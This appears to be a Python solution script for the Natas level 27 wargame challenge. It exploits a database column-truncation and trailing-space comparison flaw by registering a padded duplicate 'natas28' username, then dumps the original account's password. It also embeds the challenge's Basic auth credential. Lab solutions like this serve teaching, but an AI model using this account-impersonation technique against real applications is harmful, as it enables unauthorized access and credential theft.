

import requests
import copy
import re

proxies = {
    'http' : '127.0.0.1:8080',
    'https' : '127.0.0.1:8080'
}
authorization = 'Basic bmF0YXMyNzo1NVRCanBQWlVVSmdWUDViM0JuYkc2T045dURQVnpDSg=='

# Create a fake natas28 user.
#
# The username column is 64 characters long, anything beyond that is truncated. So, we first send a request that will create a user.
# First the existance is checked by running validUser(), with the query: SELECT * from users where username='natas28   ...   rAnd0mStR'
# The query will return false, thus createUser() will be invoked. Due to truncation, the following user will be created:
# username: natas28+<trailing-spaces-until-column-is-64chars-long>
# password: FakePassword
# This user will be bellow the row of the original natas28 user. 
natas28_fake_un = 'natas28' + (' '*64) + 'rAnd0mStR'
natas28_fake_pw = 'FakePassword'
r = requests.post(
    'http://natas27.natas.labs.overthewire.org',
    data={
        'username' : natas28_fake_un,
        'password' : natas28_fake_pw
    },
    headers = {
        'Host' : 'natas27.natas.labs.overthewire.org',
        'Referer' : 'http://natas27.natas.labs.overthewire.org/',
        'Authorization' : authorization
    },
    proxies=proxies
)
assert(r.status_code != 401)
assert( ('User ' + natas28_fake_un + ' was created!') in r.text)

# Now we attempt to login with the credentials of the fake natas user. Since trailing spaces are ignored in '=' comparisions, the query
# SELECT * from users where username='natas28'
# will return 2 rows. So validUser() will return True.
# Also checkCredentials() will return true since the query: SELECT username from users where username='natas28' and password='FakePassword'
# will return exactly 1 row, our fake natas28 user.
#
# So, then, dumpData() will be invoked with the query: SELECT * from users where username='natas28'
# This will return 2 rows, the first will will be the original user and the next row will be the fake user.
# Thus, with this POST request we get the credentials of the first user row, i.e. the original user
r = requests.post(
    'http://natas27.natas.labs.overthewire.org',
    data={
        'username' : 'natas28',
        'password' : natas28_fake_pw
    },
    headers = {
        'Host' : 'natas27.natas.labs.overthewire.org',
        'Referer' : 'http://natas27.natas.labs.overthewire.org/',
        'Authorization' : authorization
    },
    proxies=proxies
)

if r.ok:
    print("Credentials found!")
    match = re.search(r'.*\[password\] =&gt; ([a-zA-Z0-9]+).*$', r.text, re.MULTILINE) # [password] =&gt; <pw-here>
    if match:    
        print("")
        print("Credentials for Natas level28")
        print("UN: natas28")
        print("PW: " + match.groups()[0])
        print("")
else:
    assert(False and 'Exploit is 100% reliable')
